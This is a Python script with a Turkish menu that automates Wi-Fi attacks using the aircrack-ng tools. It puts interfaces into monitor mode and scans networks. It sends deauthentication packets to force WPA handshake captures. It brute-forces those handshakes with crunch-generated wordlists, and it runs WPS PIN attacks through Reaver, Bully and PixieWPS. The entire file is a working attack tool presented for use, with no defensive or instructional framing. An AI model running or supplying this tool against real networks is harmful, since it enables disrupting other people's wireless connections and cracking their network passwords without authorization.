import os
import sys
import subprocess
import time

def run_cmd(cmd_list, capture_output=False):
    try:
        result = subprocess.run(cmd_list, check=True, capture_output=capture_output, text=True)
        if capture_output:
            return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"[!] Komut hatası: {' '.join(cmd_list)}")
        print(e)
    return None


def require_root():
    if os.geteuid() != 0:
        print("[!] Bu araç root yetkisi gerektirir. 'sudo' ile tekrar deneyin.")
        sys.exit(1)


def select_interface():
    print("Mevcut arayüzler:")
    run_cmd(["iwconfig"])
    iface = input("Arayüz seçiniz (örn wlan0): ")
    return iface.strip()


def start_monitor():
    iface = select_interface()
    run_cmd(["airmon-ng", "check", "kill"])
    run_cmd(["airmon-ng", "start", iface])


def stop_monitor():
    iface = select_interface()
    run_cmd(["airmon-ng", "stop", iface])


def scan_networks():
    iface = select_interface()
    run_cmd(["airodump-ng", iface])


def capture_handshake():
    iface = select_interface()
    duration = 17 
    print(f"{duration} saniyelik tarama başlatılıyor...")
    try:
        subprocess.run(['airodump-ng', iface, '-M'], timeout=duration)
        print("Tarama tamamlandı.")
    except subprocess.TimeoutExpired:
        print("Tarama süresi doldu, işlem sonlandırıldı.")

    bssid = input("Hedef BSSID giriniz: ")
    channel = input("Kanal numarası giriniz: ")
    output = input("Çıktı dosya adı (.cap girişsiz): ")

   
    deauth_cmd = f"aireplay-ng -0 5 -a {bssid} {iface}"
    airodump_cmd = f"airodump-ng {iface} --bssid {bssid} -c {channel} -w {output}"

    subprocess.run(['xterm', '-hold', '-e', f"{airodump_cmd} | {deauth_cmd}"])

def brute_force_handshake():
    essid = input("ESSID giriniz: ")
    cap_file = input(".cap dosyasının yolu: ")
    min_len = input("Minimum şifre uzunluğu: ")
    max_len = input("Maksimum şifre uzunluğu: ")

    charsets = {
        1: "abcçdefgğhıijklmnoöpqrsştuüvwxyz",
        2: "ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ",
        3: "0123456789",
        4: "!#$%/=?{}[]-*:;",
        5: "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ",
        6: "abcçdefgğhıijklmnoöpqrsştuüvwxyz0123456789",
        7: "ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789",
        8: "!#$%/=?{}[]-*:;0123456789",
        9: "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789",
       10: "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ!#$%/=?{}[]-*:;",
       11: "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789!#$%/=?{}[]-*:;"
    }
    print("Karakter setleri:")
    for k, v in charsets.items():
        print(f"({k}) {v}")
    choice = int(input("Seçiminiz: "))
    chars = charsets.get(choice)
    if not chars:
        print("Geçersiz seçim.")
        return

    cmd = ["crunch", min_len, max_len, chars, "-o", "-" ]
    air_cmd = ["aircrack-ng", "-w", "-", "-e", essid, cap_file]
    try:
        p1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
        p2 = subprocess.Popen(air_cmd, stdin=p1.stdout, text=True)
        p1.stdout.close()
        p2.communicate()
    except Exception as e:
        print(f"[!] Bruteforce hatası: {e}")


def scan_wps():
    iface = select_interface()
    run_cmd(["airodump-ng", "-M", "--wps", iface])


def wps_attack():
    print("1) Reaver")
    print("2) Bully")
    print("3) PixieWPS")
    print("0) Ana menüye dön")
    choice = int(input("Saldırı türü seçiniz: "))
    if choice == 0:
        return
    iface = select_interface()
    bssid = input("BSSID giriniz: ")
    if choice == 1:
        run_cmd(["reaver", "-i", iface, "-b", bssid, "-vv"])
    elif choice == 2:
        channel = input("Kanal numarası: ")
        run_cmd(["bully", "-b", bssid, "-c", channel, "--pixiewps", iface])
    elif choice == 3:
        run_cmd(["reaver", "-i", iface, "-b", bssid, "-K"])
    else:
        print("Geçersiz seçim.")


def main():
    require_root()
    while True:
        os.system('clear')
        print("""
----------------------------------------------
               __.......__
            .-:::::::::::::-.
          .:::''':::::::''':::.
        .:::'     `:::'     `:::. 
   .'\  ::'   ^^^  `:'  ^^^   '::  /`.
  :   \ ::   _.__       __._   :: /   ;
 :     \`: .' ___\     /___ `. :'/     ; 
:       /\   (_|_)\   /(_|_)   /\       ;
:      / .\   __.' ) ( `.__   /. \      ;
:      \ (        {   }        ) /      ; 
 :      `-(     .  ^"^  .     )-'      ;
  `.       \  .'<`-._.-'>'.  /       .'
    `.      \    \;`.';/    /      .'
      `._    `-._       _.-'    _.'
       .'`-.__ .'`-._.-'`. __.-'`.
     .'       `.         .'       `.
   .'           `-.   .-'           `.

1) Monitor modu başlat
2) Monitor modu kapat
3) Ağ taraması
4) Handshake yakala
5) Handshake brute-force
6) WPS ağları tara
7) WPS saldırısı
0) Çıkış
----------------------------------------------
""")
        choice = int(input("Seçiminizi giriniz: "))
        if choice == 0:
            print("Çıkılıyor...")
            break
        elif choice == 1:
            start_monitor()
        elif choice == 2:
            stop_monitor()
        elif choice == 3:
            scan_networks()
        elif choice == 4:
            capture_handshake()
        elif choice == 5:
            brute_force_handshake()
        elif choice == 6:
            scan_wps()
        elif choice == 7:
            wps_attack()
        else:
            print("Geçersiz seçim.")
        input("Devam etmek için Enter'a basın...")

if __name__ == "__main__":
    main()
